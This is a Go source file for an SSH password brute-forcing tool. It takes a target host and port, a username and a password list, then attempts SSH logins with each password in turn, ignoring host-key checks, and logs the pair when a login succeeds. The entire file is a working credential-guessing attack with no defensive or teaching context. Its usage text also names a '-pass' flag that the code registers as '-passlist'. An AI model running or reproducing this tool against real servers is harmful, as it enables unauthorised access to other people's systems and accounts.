
package main

import (
	"golang.org/x/crypto/ssh"
	"log"
	"fmt"
	"bufio"
	"os"
	"flag"
)


type Options struct{
	url		string
	user	string
	passList	string
}


var OPTIONS = Options{}


func parseOptions() {
	if len(os.Args) != 7 {
		fmt.Printf("Usage: %s -url <URL:PORT> -user <USERNAME> -pass <PASSWORD-LIST>\nPassword list should be separated with newline", os.Args[0])
		os.Exit(1)
	}

	flag.StringVar(&OPTIONS.url, "url", "", "URL string with the port. separated with a colon")
	flag.StringVar(&OPTIONS.user, "user", "", "Login username, it could be admin, root, etc.")
	flag.StringVar(&OPTIONS.passList, "passlist", "", "Password list name")
	flag.Parse()
}


func auth(password string) {
	config := &ssh.ClientConfig{
		User: OPTIONS.user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	_, err := ssh.Dial("tcp", OPTIONS.url, config)
	if err != nil {
		log.Println(err)
	} else {
		log.Printf("Found! user=%s, pass=%s\n", OPTIONS.user, password)
		os.Exit(0)
	}
}


func main() {
	parseOptions()
	file, err := os.Open(OPTIONS.passList)
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	reader := bufio.NewScanner(file)
	var password string
	for reader.Scan() {
		password = reader.Text()
		auth(password)
	}
}